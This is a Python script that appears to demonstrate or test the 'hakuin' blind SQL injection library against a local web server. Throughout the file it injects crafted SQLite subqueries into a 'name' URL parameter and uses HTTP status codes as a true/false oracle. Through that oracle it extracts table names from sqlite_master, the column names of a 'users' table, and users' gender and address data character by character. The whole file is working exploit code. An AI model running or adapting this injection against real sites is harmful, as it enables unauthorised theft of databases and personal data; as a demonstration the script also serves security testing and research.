import copy
import requests
import sys
import urllib.parse

import hakuin
from hakuin.utils import CHARSET_SCHEMA, CHARSET_ASCII


class ExfTables(hakuin.TextExfiltrator):
    def try_query(self, table, column, row, s, values):
        try_eos = False
        if '</s>' in values:
            values = copy.deepcopy(values)
            values.remove('</s>')
            try_eos = True
        values = ''.join(values).encode('ascii').hex()

        eos_check = '1 = 1' if try_eos else f'substr({column}, {len(s) + 1}, 1) != ""'
        query = f'''select {eos_check} and instr(x'{values}', substr({column}, {len(s) + 1}, 1))
                from {table} where type = 'table' limit 1 offset {row}'''

        query = ' '.join([x for x in query.replace('\n', ' ').split(' ') if x != ''])
        print(query)
        query = urllib.parse.quote(query)
        url = f'http://127.0.0.1:8000/?name=NONEXISTANT%22%20or%20({query})--'
        r = requests.get(url)

        assert r.status_code in [200, 404], f'Unexpected resposne code: {r.status_code}'
        return r.status_code == 200



class ExfData(hakuin.TextExfiltrator):
    def try_query(self, table, column, row, s, values):
        try_eos = False
        if '</s>' in values:
            values = copy.deepcopy(values)
            values.remove('</s>')
            try_eos = True
        values = ''.join(values).encode('ascii').hex()

        eos_check = '1 = 1' if try_eos else f'substr({column}, {len(s) + 1}, 1) != ""'
        query = f'''select {eos_check} and instr(x'{values}', substr({column}, {len(s) + 1}, 1))
                from {table} limit 1 offset {row}'''

        query = ' '.join([x for x in query.replace('\n', ' ').split(' ') if x != ''])
        print(query)
        query = urllib.parse.quote(query)
        url = f'http://127.0.0.1:8000/?name=NONEXISTANT%22%20or%20({query})--'
        r = requests.get(url)

        assert r.status_code in [200, 404], f'Unexpected resposne code: {r.status_code}'
        return r.status_code == 200


if len(sys.argv) == 1:
    res = ExfTables().exfiltrate_data(hakuin.get_model_tables(), CHARSET_SCHEMA, verified=True, table='sqlite_master', column='name', n=4)
    # res = ExfData().exfiltrate_data(hakuin.get_model_columns(), CHARSET_SCHEMA, verified=True, table='pragma_table_info("users")', column='name', n=7)
    # res = ExfData().exfiltrate_data_adaptive(hakuin.get_model_clean(5), table='users', column='gender', n=100)
    # res = ExfData().exfiltrate_data_adaptive(hakuin.get_model_clean(5), table='users', column='address', n=1000)
else:
    res = ExfTables().exfiltrate_data_binary(CHARSET_ASCII, verified=True, table='sqlite_master', column='name', n=4)
    # res = ExfData().exfiltrate_data_binary(CHARSET_ASCII, verified=True, table='pragma_table_info("users")', column='name', n=7)
    # res = ExfData().exfiltrate_data_binary(CHARSET_ASCII, verified=False, table='users', column='gender', n=100)
    # res = ExfData().exfiltrate_data_binary(CHARSET_ASCII, verified=True, table='users', column='address', n=1000)
print('RESULT:', res)
